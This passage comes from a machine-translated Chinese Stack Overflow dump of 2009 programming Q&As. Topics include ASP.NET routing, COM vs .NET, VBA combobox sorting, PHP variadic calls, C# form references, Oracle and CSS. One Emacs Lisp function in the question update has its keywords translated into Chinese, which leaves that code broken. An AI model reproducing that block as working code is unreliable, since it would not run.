    cBase.m_nPrivate = 2; // not allowed: can not access private members from outside class
    cBase.m_nProtected = 3; // not allowed: can not access protected members from outside class
} 
```

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2009-05-13T20:51:43.597

它本质上是对派生类中基类的公共和受保护成员的访问保护。使用公共继承，派生类可以看到基类的公共和受保护成员。使用私有继承，它不能。使用受保护的，派生类和从其派生的任何类都可以看到它们。

# web-services - Asp.net 路由、WebServices 和 IIS7 经典

> ID：860340
> 
> 赞同：2
> 
> 时间：2009-05-13T20:47:10.500
> 
> 标签：web-services, iis-7, asmx, asp.net-routing

我有一个在 IIS7 Classic 上运行的 Web 表单应用程序。它使用 .asmx 样式的 Web 服务来处理网站的客户端重部分。

我们的任务是在“友好的 url”中分层，并决定使用新的 Asp.net 路由。我们在 IIS 中有一个规则将*所有请求*映射到 aspnet_isapi.dll，这在我们的 web.config (system.webServer/hanlers) 中产生了这个声明：

```
<add name="asp.net routing" path="*" verb="*" modules="IsapiModule" scriptProcessor="C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_isapi.dll" resourceType="Unspecified" preCondition="classicMode,runtimeVersionv2.0,bitness32" /> 
```

但是现在路由会破坏我们的 .asmx Web 服务请求（形式为[http://example.com/blah.asmx/SomeMethod](http://example.com/blah.asmx/SomeMethod)）。对 Web 服务的任何请求都会给我们带来无穷乐趣：

```
Failed to Execute URL.
[HttpException (0x80004005): Failed to Execute URL.]
System.Web.Hosting.ISAPIWorkerRequestInProcForIIS6.BeginExecuteUrl(String url, String method, String childHeaders, Boolean sendHeaders, Boolean addUserIndo, IntPtr token, String name, String authType, Byte[] entity, AsyncCallback cb, Object state) +2004885
System.Web.HttpResponse.BeginExecuteUrlForEntireResponse(String pathOverride, NameValueCollection requestHeaders, AsyncCallback cb, Object state) +393
System.Web.DefaultHttpHandler.BeginProcessRequest(HttpContext context, AsyncCallback callback, Object state) +223
System.Web.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() +8677954
System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously) +155 
```

将此行放入我们的路线设置中：

```
routes.Add(new Route("{service}.asmx/{*pathInfo}", new StopRoutingHandler())); 
```

仍然给我们留下“无法执行 URL”异常。我知道这条路线是匹配的，因为：

```
public sealed class DieHandler : IRouteHandler
{
    #region IRouteHandler Members

    public IHttpHandler GetHttpHandler(RequestContext requestContext)
    {
        throw new NotImplementedException();
    }

    #endregion
}
routes.Add(new Route("{service}.asmx/{*pathInfo}", new DieHandler())); 
```

使用该路由而不是“无法执行 URL”，我会看到“方法未实现”，就像我期望的那样。

我怀疑我们的 * -> aspnet_isapi.dll 正在造成严重破坏，因为我在搜索谷歌时没有发现其他人这样做。

提前感谢您的任何见解。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2010-01-28T23:14:20.453

您需要添加`requireAccess="None"`到 web.config 中的处理程序，即：

```
<add name="aspnet_isapi 32-bit" path="*" verb="*" modules="IsapiModule" scriptProcessor="C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_isapi.dll" resourceType="Unspecified" requireAccess="None" preCondition="classicMode,runtimeVersionv2.0,bitness32" /> 
```

这允许正确处理文件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:53:53.267

您想添加一条规则以忽略某些路由。请参阅： [Asp.Net 路由：如何忽略多个通配符路由？](https://stackoverflow.com/questions/30302/asp-net-routing-how-do-i-ignore-multiple-wildcard-routes) 或 [http://haacked.com/archive/2008/07/14/make-routing-ignore-requests-for-a-file-extension.aspx](http://haacked.com/archive/2008/07/14/make-routing-ignore-requests-for-a-file-extension.aspx)

# c# - 我应该使用什么设计模式在桌面应用程序的多个对话框之间传递信息？

> ID：860345
> 
> 赞同：0
> 
> 时间：2009-05-13T20:48:03.383
> 
> 标签：c#, .net, design-patterns, desktop

我正在使用 .NET 开发一个 CRUD 应用程序，并且我必须实现大约 10 个左右的对话框。用户将在一个对话框中输入信息，然后根据传递的信息被发送到另一个对话框。这个应用程序基本上反映了 Spring MVC 和 JSF 在 JSP 页面之间传递信息时所做的事情。

是否有可以与 MVC 模式/体系结构一起使用的设计模式来帮助我在对话框之间传输信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T20:49:51.790

[观察者模式](http://en.wikipedia.org/wiki/Observer_pattern)在许多这些情况下都很有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:58:56.033

试试[观察者模式](http://en.wikipedia.org/wiki/Observer_pattern)。如果观察者之间的依赖关系开始变得过于混乱，请考虑切换到[Mediator 模式](http://en.wikipedia.org/wiki/Mediator_pattern)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-15T04:02:38.917

可能需要考虑[应用程序控制器](http://martinfowler.com/eaaCatalog/applicationController.html)模式。（也在[这里](http://msdn.microsoft.com/en-us/library/cc304764.aspx)）另外，我不确切知道您的程序在做什么（即对话链末尾的结果是什么），但是这种模式与[Builder](http://www.dofactory.com/Patterns/PatternBuilder.aspx)模式结合使用效果很好。

# resize - 如何链接我的 YUI 数据表，以便在调整它所在的 YUI 布局面板的大小时调整它的大小

> ID：860346
> 
> 赞同：0
> 
> 时间：2009-05-13T20:48:13.370
> 
> 标签：resize, yui, yui-datatable

我正在开发一个相当简单的数据库馈送 Web 应用程序，它实际上只是在网格控件中显示数据库的内容。我有一个 YUI 数据表控件，它在网格中显示数据，它位于一个 YUI 布局控件中，它将我的屏幕分成 4 个面板。数据表的大小完全适合 yui 布局控件的一个面板。一切都很好，除了一件事。当用户调整其中一个面板的大小时，我希望该面板调整该面板中显示的数据的大小。我看过 YUI 的例子。但它们都指的是 yui 调整大小控件。我不清楚该控件是如何工作的，或者我是否需要实例化，或者 yui 布局面板是否继承了它的属性……主要是不清楚如何在面板内调整表格的大小。有任何想法吗？我正在使用 2.7.0

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-12-14T21:25:41.003

```
.yui-dt-scrollable table {
    width: 100%;
} 
```

# .net - COM 和 .NET 有什么区别？

> ID：860348
> 
> 赞同：5
> 
> 时间：2009-05-13T20:48:24.227
> 
> 标签：.net, com

### 复制

> [net组件和com组件有什么区别](https://stackoverflow.com/questions/688456/what-is-the-difference-between-net-components-and-com-components)

COM 和 .NET 之间的确切区别是什么？.NET 是 COM 的简单外衣还是完全不同的东西？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-13T20:56:49.157

有很多不同之处，.NET 绝对不是 COM 的外衣。

一些主要区别是：

*   尽管 COM 和 .NET 都编译为 DLL 文件，但 .NET DLL（称为程序集）是使用[公共语言运行时运行](http://en.wikipedia.org/wiki/Common_Language_Runtime)的，这是一种在代码运行时负责处理某些事情（例如内存管理、线程、垃圾收集和安全性）的虚拟机.

*   .NET 程序集不一定需要“注册”，COM DLL 需要在计算机的注册表中注册。

*   .NET 带有一个完整的对象框架，可以构建、使用或扩展这些对象来完成各种任务。该框架比旧 Visual Studio 包附带的 COM 库要全面得多。

我敢肯定还有很多话要说……您*几乎*可以将 .NET 视为运行在 Windows 之上的额外操作系统层——它是如此广泛。[.NET Framework](http://en.wikipedia.org/wiki/.NET_Framework)的维基百科条目可能是开始阅读的好地方。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T20:53:34.280

完全不同...

.NET 在通用运行时（更不用说 JIT 编译和 MSIL）之上提供了一整套语言。

COM 确实提供了一种通过软件上方的层注册共享程序集和重用代码的方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T20:54:41.207

.NET 提供了一个虚拟机、一个扩展的代码库和一个类似 Java 的字节码（中间语言），您的程序可以编译成这些字节码。

COM 只是一种用于创建对象并允许它们相互交互的二进制互操作性标准。

.NET 支持 COM 通信以及许多其他互操作模型。这比 COM 本身要大得多。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T20:51:05.080

正如 Monty Python 所说，这是完全不同的东西。.NET for one 允许您选择“注册”（GAC）或不（本地目录）。但是没有一个确切的区别。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T21:12:46.933

.NET 作为 COM 之后的下一步被引入以克服 COM 问题。只说一些优点：

*   .NET 是一个运行时环境 (CLR)，它具有垃圾收集（不仅仅是引用计数）、通用类型系统 (CTS)、代码访问安全 (CAS)、基类库 (BCL)、丰富的框架等。
*   .NET 语言编译器不会创建 Win32 代码，而是生成中间语言 (IL) 代码。
*   严格来说COM只是一个接口规范。

微软从 90 年代开始就将 COM 用于技术：OLE、ActiveX、DirectX 等。这些技术仍在使用 COM 开发。然而，新的现代技术正在使用 .NET：Windows Presentation Foundation (WPF)、Windows Communitation Foundation (WCF)、许多研究项目......

# javascript - iframe 中的 CRM 视图现在在新窗口中打开，为什么？

> ID：860356
> 
> 赞同：1
> 
> 时间：2009-05-13T20:50:34.893
> 
> 标签：javascript, html, dynamics-crm

它已经工作了一年多，并开始在新窗口中打开。我不知道有什么变化。
我是按照[Stunnware](http://www.stunnware.com/crm2/topic.aspx?id=AdvancedFind1)的指南完成的。

页面中的代码是：

```
<html>
<head/>
<body class='stage' onload='resultRender.submit()'>
    <FORM id='resultRender' method='post' action='/ALI/AdvancedFind/fetchData.aspx' target='resultFrame'>
    <INPUT value='<fetch version="1.0" output-format="xml-platform" mapping="logical" distinct="false"><entity name="account"><attribute name="websiteurl"/><attribute name="accountnumber"/><attribute name="new_geocat"/><attribute name="new_contracttype"/><attribute name="name"/><attribute name="accountid"/><order attribute="name" descending="false"/><filter type="and"><condition attribute="parentaccountid" operator="null"/><condition attribute="statecode" operator="eq" value="0"/></filter></entity></fetch>' type=hidden name=FetchXml> 
    <INPUT value='<grid name="resultset" object="1" jump="name" select="1" preview="1" icon="1"><row name="result" id="accountid"><cell name="name" width="200"/><cell name="new_contracttype" width="125"/><cell name="new_geocat" width="100"/><cell name="accountnumber" width="100"/><cell name="websiteurl" width="100"/></row></grid>' type='hidden' name='LayoutXml'> 
    <INPUT value='account' type='hidden' name='EntityName'> 
    <INPUT value='{00000000-0000-0000-00AA-000000666000}' type='hidden' name='DefaultAdvFindViewId'> 
    <INPUT value='{B444C27F-FC37-DD11-BDAA-000C292407C5}' type='hidden' name='ViewId'> 
    <INPUT value='1039' type='hidden' name='ViewType'> 
    <INPUT value='name' type='hidden' name='SortCol'> 
    <INPUT value='false' type='hidden' name='SortDescend'> 
    </FORM>
</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-06-08T19:54:31.113

经过反复试验，我终于弄清楚了。我将下面的行添加到我的 HTML 页面中，就在表单之后。

```
<iframe id='resultFrame' ></iframe> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-02-16T13:09:11.557

您也可以尝试：

在 Iframe 属性窗口中，确保取消选中“限制跨框架脚本”复选框。

这解决了我的一个与上面类似的问题。

谢谢，

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2010-01-28T11:03:35.593

好吧，网页正在新窗口中打开，因为表单目标属性设置为结果框架，但指定的框架不在页面上。因此，默认操作页面正在新窗口中打开。只需删除框架的目标属性即可。现在框架将在同一个窗口中打开。您也可以将目标指定为“_self”。

# python - Emacs 函数在 Python 模式下向 __all__ 添加符号？

> ID：860357
> 
> 赞同：5
> 
> 时间：2009-05-13T20:50:43.100
> 
> 标签：python, emacs

是否有现有的 Emacs 函数可以`__all__`在编辑 Python 代码时添加当前点下的符号？

例如，假设光标在第`o`一个`foo`：

```
#    v---- cursor is on that 'o'
def foo():
    return 42 
```

如果你做了**Mx python-add-to-all**（或其他），它会添加`'foo'`到`__all__`.

当我四处搜索时，我没有看到一个，但是，和往常一样，也许我错过了一些明显的东西。

## 更新

我尝试了[Trey Jackson 的答案](https://stackoverflow.com/questions/860357/emacs-function-to-add-symbol-to-all-in-python-mode/860569#860569)（谢谢，Trey！）并进行了一些修复/增强，以防万一有人感兴趣（不再重复插入，`__all__`如果它不存在，则放置一个更典型的位置）：

```
(defun python-add-to-all ()
  “取点下的符号并将其添加到 __all__
清单，如果它还没有的话。”
  （交互的）
  （保存游览
    (let ((thing (thing-at-point 'symbol)))
      (if (progn (goto-char (point-min))
                 （让（找到）
                   （而（和（未找到）
                               (re-search-forward (rx symbol-start "__all__" symbol-end
                                                      （0+空格）“=”（0+空格）
                                                      （语法左括号））
                                                  无 t))
                     (setq found (not (python-in-string/comment))))
                   成立））
          (当 (不是 (看着 (rx-to-string
                                  `(and (0+ (not (syntax close-parenthesis)))
                                        （语法字符串引用），事物（语法字符串引用）））））
            （插入（格式“\'%s\',”东西））
        （缓冲区开始）
        ;; 放在任何导入行之前，或者如果没有，则放在第一类或
        ;; 功能。
        (when (not (re-search-forward (rx bol (or "import" "from") symbol-end) nil t))
          (re-search-forward (rx symbol-start (or "def" "class") symbol-end) nil t))
        （前锋-1）
        (插入 (格式 "\n__all__ = [\'%s\']\n" 东西))))))

```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-05-13T21:40:04.937

不是python程序员，我不确定这是否涵盖所有情况，但在一个简单的情况下对我有用。如果数组存在，它会将符号添加到数组中，`__all__`如果不存在则创建。 *注意：它不解析数组以避免重复插入。*

```
(defun python-add-to-all ()
  "take the symbol under the point and add to the __all__ routine"
  (interactive)
  (save-excursion
    (let ((thing (thing-at-point 'word))
          p)
      (if (progn (goto-char (point-min))
                 (re-search-forward "^__all__ = \\[" nil t))
          (insert (format "\"%s\", " thing))
        (goto-char (point-min))
        (insert (format "__all__ = [\"%s\"]\n" thing)))))) 
```

# .net - FormsAuthenticationModule 是否检测是否……？

> ID：860361
> 
> 赞同：3
> 
> 时间：2009-05-13T20:51:20.353
> 
> 标签：.net, asp.net, authentication, forms-authentication, httpmodule

*FormsAuthenticationModule*用于使用加密的 cookie 跟踪用户和角色信息。

但是该模块是否还包含实际检测用户请求网页是否具有表单身份验证票证的代码，如果没有，则将用户重定向到登录页面，或者实际上是*UrlAuthorizationModule*告诉*FormsAuthenticationModule*将未经授权/未经身份验证的用户重定向到登录页面？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T23:53:30.680

奇怪的是，我这周刚研究过这个。

事实证明，FormsAuthenticationModule 确实在 EndRequest 事件处理程序中进行了实际重定向。但是，它并没有决定应该发生重定向。如果响应状态码是 401（未授权），它会进行重定向。

UrlAuthorizationModule 是做出决定的地方（如另一个答案中所述），但它所做的只是通过将响应状态代码设置为 401 来指示请求未授权。

所以，实际上是这两个模块协同工作，使重定向到登录页面发生。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T23:43:31.290

根据文档，仅[FormsAuthenticationModule](http://msdn.microsoft.com/en-us/library/system.web.security.formsauthenticationmodule_members.aspx)

> 启用表单身份验证时，设置 ASP.NET 应用程序的用户身份。

然而，环顾其他地方（[Erv](https://stackoverflow.com/questions/860361/does-formsauthenticationmodule-detect-whether/860994#860994)指出这一点的道具），然后表单身份验证模块负责通过挂钩到应用程序的[EndRequest](http://msdn.microsoft.com/en-us/library/system.web.httpapplication.endrequest.aspx)事件将用户重定向到登录页面

这意味着它与角色无关 - 角色由[RoleManagerModule处理](http://msdn.microsoft.com/en-us/library/system.web.security.rolemanagermodule.aspx)

因此[UrlAuthorizationModule](http://msdn.microsoft.com/en-us/library/system.web.security.urlauthorizationmodule_members.aspx)使用 Web 配置中配置的身份验证模块（即 Forms、[Passport](http://msdn.microsoft.com/en-us/library/system.web.security.passportauthenticationmodule.aspx) /Live、[Windows](http://msdn.microsoft.com/en-us/library/system.web.security.windowsauthenticationmodule.aspx)等）和角色提供程序（使用适当的角色模块）来强制访问，如果[CheckUrlAccessForPrinciple](http://msdn.microsoft.com/en-us/library/system.web.security.urlauthorizationmodule.checkurlaccessforprincipal.aspx)实际检查用户访问权限返回 false，引发 401 错误，然后返回 ASP.NET 处理。

然后应用程序引发 EndRequest 事件，该事件由 FormsAuthenticationModule 拾取，最终将用户重定向到 web.config 的 Forms auth 部分中定义的默认登录页面。

# vba - 按字母顺序对组合框值进行排序

> ID：860366
> 
> 赞同：3
> 
> 时间：2009-05-13T20:52:35.983
> 
> 标签：vba, sorting, excel

我在 Excel 的用户表单中有一个组合框。按字母顺序排序的最简单方法是什么？它的值在 vba 中是硬编码的，新的值只是添加到底部，因此它们已经没有任何顺序。

目前正在使用用户表单，以便我们的用户可以将数据从我们的数据库导入到 excel 中。组合框在那里，因此他们可以指定要导入的客户端数据。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2010-07-16T19:27:14.127

在添加它们时，将它们与组合框中已有的值进行比较。如果它们小于您遇到的项目，请更换该项目。如果它们不小于，则继续前进，直到找到该项目小于的东西。如果找不到该项目，则将其添加到末尾。

```
For X = 0 To COMBOBOX.ListCount - 1
  COMBOBOX.ListIndex = X
  If NEWVALUE < COMBOBOX.Value Then
     COMBOBOX.AddItem (NEWVALUE), X
     GoTo SKIPHERE
     End If
Next X
        COMBOBOX.AddItem (NEWVALUE)
SKIPHERE: 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-07-08T14:41:45.080

它很容易如下：

```
Sub fill_combobox()
Dim LastRow, a, b As Long, c As Variant
ComboBox1.Clear
LastRow = Sheets("S1").Cells(Rows.Count, 2).End(xlUp).Row

For x = 2 To LastRow
ComboBox1.AddItem Cells(x, 2).Value
Next
  For a = 0 To ComboBox1.ListCount - 1
  For b = a To ComboBox1.ListCount - 1
        If ComboBox1.List(b) < ComboBox1.List(a) Then
c = ComboBox1.List(a)
    ComboBox1.List(a) = ComboBox1.List(b)
    ComboBox1.List(b) = c
       End If
  Next
  Next
End Sub 
```

我在这个模板中使用过：[按字母顺序排序组合框](https://netmerkez.wordpress.com/2016/07/07/sorting-userform-combobox-alphabetically/)

[![在此处输入图像描述](https://i.stack.imgur.com/th671.jpg)](https://i.stack.imgur.com/th671.jpg)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-14T21:07:51.520

创建要排序的数组并不像您想象的那么难。请参阅[对多列列表框进行排序](http://www.dailydoseofexcel.com/archives/2004/05/24/sorting-a-multicolumn-listbox/)。您可以将 List 属性直接放入 Variant 类型，将其排序为数组，然后将该 Variant Array 转储回 List 属性。仍然不是很好，但它是最好的 VBA。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T21:12:50.537

VBA 缺少对此类事物的内置排序功能。很遗憾。

一种不涉及自己实现/使用一种流行排序算法的廉价方法是`ArrayList`通过 COM 使用 .NET Framework 的类：

```
Sub test()
  Dim l As Object
  Set l = CreateObject("System.Collections.ArrayList")

  ''# these would be the items from your combobox, obviously
  ''# ... add them with a for loop
  l.Add "d"
  l.Add "c"
  l.Add "b"
  l.Add "a"

  l.Sort

  ''# now clear your combobox

  Dim k As Variant
  For Each k In l
    ''# add the sorted items back to your combobox instead
    Debug.Print k
  Next k

End Sub 
```

将此例程作为`UserForm_Initialize`. 如果没有安装框架，这当然会失败。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-14T02:01:59.247

这使用了 ADO 库，我猜大多数计算机（安装了 Excel）都可以使用它。

```
 Sub SortSomeData()
Dim rstData As New ADODB.Recordset
rstData.Fields.Append "Name", adVarChar, 40
rstData.Fields.Append "Age", adInteger

rstData.Open

rstData.AddNew
rstData.Fields("Name") = "Kalpesh"
rstData.Fields("Age") = 30
rstData.Update

rstData.AddNew
rstData.Fields("Name") = "Jon"
rstData.Fields("Age") = 29
rstData.Update

rstData.AddNew
rstData.Fields("Name") = "praxeo"
rstData.Fields("Age") = 1
rstData.Update

MsgBox rstData.RecordCount
Call printData(rstData)

Debug.Print vbCrLf & "Name DESC"
rstData.Sort = "Name DESC"
Call printData(rstData)

Debug.Print vbCrLf & "Name ASC"
rstData.Sort = "Name ASC"
Call printData(rstData)

Debug.Print vbCrLf & "Age ASC"
rstData.Sort = "Age ASC"
Call printData(rstData)

Debug.Print vbCrLf & "Age DESC"
rstData.Sort = "Age DESC"
Call printData(rstData)
End Sub

Sub printData(ByVal data As Recordset)
    Debug.Print data.GetString
End Sub 

```

希望这能给你足够的背景知识来开始。
仅供参考 - 这是一个断开连接的记录集（用于内存表的 .net 数据集的更简单版本）。

# php - (N 未知) $controller->$action($param1, $param2, $param3... $paramN);

> ID：860367
> 
> 赞同：-2
> 
> 时间：2009-05-13T20:52:39.663
> 
> 标签：php, arrays, parameters, methods, call

（N 未知）

$controller->$action($params);

一定是

$controller->$action($param1, $param2, $param3... $paramN);

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T21:18:20.060

不太确定你想要什么，但如果你想调用一个参数数量未知的方法，你可以使用[`call_user_func_array()`](http://php.net/call_user_func_array)

例如：

```
$result = call_user_func_array(array($controller, $action), $params); 
```

它给出了一个数组，如：

```
array(1, 2, 'a'); 
```

相当于：

```
$result = $controller->$action(1, 2, 'a'); 
```

您可以通过执行以下操作来构建这样的数组，但我认为首先使用数组会更好

```
$param1 = 'Something';
$param2 = 'Test';

$j = 1;
$params = array();
while (isset(${'param' . $j})) {
    $params[] = ${'param' . $j};
    $j++;
}

print_r($params);

//will output
Array
(
    [0] => Something
    [1] => Test
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T21:16:08.737

PHP 使用非常灵活的数组。您可以将任何数据类型放入其中。这消除了对 N 个参数的需要。只需使用数组作为参数并循环遍历所有元素（参数）。

如果您使用混合类型作为参数，您可以在循环中使用 gettype($var) 函数检查变量的类型。

```
<?php
    $params = Array($param1, $param2, $paramN);
    $controller->$action($params)
?> 
```

# c# - 非静态字段、方法或属性需要对象引用？

> ID：860370
> 
> 赞同：5
> 
> 时间：2009-05-13T20:53:22.127
> 
> 标签：c#, object, reference, properties

我知道这可能是一个非常新的问题，所以我道歉。

我正在尝试从另一个表单 MaxScore 访问 Form1 上标签的 Text 属性。

当我单击 MaxScore 上的 Ok 按钮时，我想使用 max.ToString() 将 Form1 的 myGameCountLbl.Text 设置为 Form1 的变量，最大值。

这是我在 MaxScore 的 OK 按钮事件中的代码：

```
private void okBtn_Click(object sender, EventArgs e)
{
    Form1.myGameCountLbl.Text = Form1.max.ToString();
    Form1.compGameCountLbl.Text = Form1.max.ToString();
} 
```

但是当我去编译它时，我得到了错误：

> 非静态字段、方法或属性“Towergame_2.Form1.myGameCountLbl”需要对象引用

Towergame_2.Form1.max 和 Towergame_2.Form1.compGameCountLbl 出现同样的错误。

不太清楚如何解决这个问题。Max 是一个公共变量，两个标签也是公共的。

谢谢！

这是我的构造函数中的代码（感谢 lassevk 的代码！）：

```
public Form1()
{
    //initialize vars
    myHp = 100;
    compHp = 100;
    youWon = 0;
    compWon = 0;
    money = 100;
    canCompAttack = true;
    gameOver = false;

    //show HowToPlay Dialogue
    HowToPlay howToPlay = new HowToPlay();
    howToPlay.ShowDialog();

    using (MaxScore maxScore = new MaxScore())
    {
        maxScore.MainForm = this;
        maxScore.ShowDialog();
    }

    InitializeComponent();
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T20:58:50.077

有没有可能 Form1 是类的名称？

您需要引用表单类的实例。

由于`okBtn`不在同一个表单上，因此您需要为`MaxScore`表单提供对`Form1`实例的引用。

例如，您可以将其添加到您的`MaxScore`表单中：

```
public Form1 MainForm { get; set; } 
```

然后在你的`okBtn_Click`方法中，你会这样写：

```
private void okBtn_Click(object sender, EventArgs e)
{
    MainForm.myGameCountLbl.Text = MainForm.max.ToString();
    MainForm.compGameCountLbl.Text = MainForm.max.ToString();
} 
```

然后当你构建`MaxScore`时`Form1`（我假设这就是你正在做的）：

```
using (MaxScore scoreForm = new MaxScore())
{
    scoreForm.MainForm = this;
    scoreForm.ShowDialog();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T22:24:48.110

关于解决您的问题，我同意@lassevk。我还建议将设置标签的行为包装到 Form1 类中的一个方法中，这只会帮助您保持代码更简洁，并让您负责/了解要更新哪些字段以及如何更新它们包含在父表单中。您只需在 Form1 中定义一个公共方法，该方法接受一个字符串值并使用该值更新特定标签。然后在 MaxScore 表单中，在您的按钮单击事件处理程序中，您将调用该方法，而不是尝试直接访问这些标签控件。

只是思考的食物。

# c# - 列出哪些内容类型使用指定的网站栏

> ID：860377
> 
> 赞同：1
> 
> 时间：2009-05-13T20:55:05.853
> 
> 标签：c#, sharepoint, content-management-system, content-type

问候，SO专家！

有没有办法列出哪些内容类型使用 SharePoint 中的指定网站栏？我将不得不删除一个站点列（它已被隐藏在引擎盖下）并重新创建它，并且我想知道在删除站点列之前我需要从哪些内容类型中删除它。

有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T21:53:09.087

是的，遍历每个 SPSite、SPWeb、SPList、ContentType，并显示它的使用位置。不过，这将需要自定义代码:(

否则，您可以获得[SharePointManager](http://www.codeplex.com/spm)并使用它来快速浏览。

最好的办法是处理导致您走上这条道路的根本问题，即使用 Web 界面创建内容类型。在经历了一些痛苦之后，我们学会了可靠地做到这一点的唯一方法是创建一个包含其中定义的列和内容类型的特性，并将其作为解决方案发布。这使您能够准确设置内容类型和字段。

发布内容类型/字段需要做很多工作，但值得避免在整个网站上运行代码以删除出错字段的实例。

# sql - 在 Oracle SQL 语句中使用分号

> ID：860378
> 
> 赞同：3
> 
> 时间：2009-05-13T20:55:26.510
> 
> 标签：sql, performance, oracle

*免责声明：我刚开始签订一份新合同，这迫使我从 MSSQL 切换到 Oracle。所以我完全是 Oracle 的新手，可能会带来许多糟糕的 MSSQL 实践。好吧，继续这个问题……*

根据[this thread中的答案](https://stackoverflow.com/questions/182534/how-long-does-it-take-to-become-reasonably-proficient-in-orcle-given-sql-server/183657#183657)，分号不好，应该避免。在花了几个小时试图弄清楚为什么我的查询在 SQL Developer 中运行如此缓慢之后，我第一手意识到了这一点。从复杂查询的末尾删除分号后，它在几秒钟内完成（与我在几分钟后放弃它相比，这是删除分号之前的情况）。这种行为让我大吃一惊，Google 搜索并没有显示太多关于何时以及为什么我应该或不应该在我的 SQL 语句中使用分号的信息。任何人都可以通过简短的解释来澄清这一点吗？

如果您有任何在线资源链接，供从 MSSQL 迁移到 Oracle 的贫穷开发人员使用，我将不胜感激！

谢谢！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-05-13T21:03:37.290

这不是分号。重新运行相同的查询意味着这些行已经被缓存，因此您可以更快地恢复它们。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-14T07:15:29.023

我有 5 年以上的 MS SQL 经验和 4 年以上的 Oracle 开发经验。我知道你会讨厌很多 Oracle 特性，尤其是在 SQL 中，;) 但放轻松。Oracle 是一个非常强大的 DBMS。尽管从很多角度来看，我更喜欢 MSSQL 而不是 Oracle，但这是一个不同的话题。

至于你的问题：

分号只是一个语句分隔符。

SQL 开发人员正在使用 Java 和 OCI，因此您可能会遇到不同的问题（我只是猜测可能有问题）。

如果您觉得某些东西运行不正确，我建议您获取该查询并在 SQLPLUS 而不是 Visual Query Tools 中运行它，因为它会给您正确的感觉。

祝 Oracle 开发顺利。

访问[SQL*Plus 常见问题解答](http://www.orafaq.com/wiki/SQL*Plus_FAQ)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T21:17:59.577

这是 Kevin 和 Daniel Kline 所著的一本书，它将极大地帮助 SQL in a Nutshell

这具有 Oracle 和 SQl 服务器的语法，因此如果您知道如何用 t-SQL 编写，您可以轻松地了解如何将事物转换为 Oracle 语法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T21:12:25.390

作为 PowerBuilder、Java、.NET 和 TOAD 的开发人员与 Oracle 合作了 10 多年，这听起来很奇怪。

我建议使用解释计划来查找正在发生的事情并确保数据库是健康的，具有适当的统计数据和索引。

从早期版本的 Oracle 中，我记得使用基于规则的优化可能会导致此类性能问题，但最近基于成本的优化和统计已使此类问题成为过去。

# html - 仅使用 css 将图像从表格单元格移动到浏览器窗口的左上角

> ID：860382
> 
> 赞同：0
> 
> 时间：2009-05-13T20:56:04.230
> 
> 标签：html, css

我正在对网站进行外观更改，但我只能更改 CSS 而不是 aspx。我想将表格中单元格内的图像移动到页面中大约 100/100px 回到 0/0px。

该标签有一个唯一的 id，我可以用它来获取它，但是表格的 id 不是唯一的，并且从 css 在表格上设置背景图像会影响网站的其他部分。我还尝试在正文上设置背景图像，但是此页面是一个框架集，其中每个框架都引用相同的样式表。结果是我在每一帧中都得到了一个背景图像。

一个大大简化的 html 版本如下：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>move image</title>
        <style type="text/css">
            #imgLogo {/*how can I move this to 0,0?*/}
        </style>
    </head>
    <body>
        <table style="margin-left:100px; margin-top:100px;">
            <tr>
                <td>
                    <img id="imgLogo" src="http://www.google.com/intl/en_ALL/images/logo.gif" alt="google" />
                </td>
            </tr>
        </table>
    </body>
</html> 
```

***编辑***

感谢所有说要使用绝对位置的人。这当然修复了示例 html，但不是真正的问题。原因是其中一个父元素已经设置了绝对位置但没有坐标。将此元素设置在左侧和顶部位置就可以了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T21:00:04.037

使用 CSS 定位：

```
#imgLogo {
position:absolute;
top:100px;
left:100px;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T21:00:07.810

将表格 ccs 设置为 position:relative 并将图像设置为 position:absolute 并将其设置为 top:0px 和 left:0px;

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T21:02:32.377

绝对定位是关键：

```
#imgLogo {
    position: absolute;
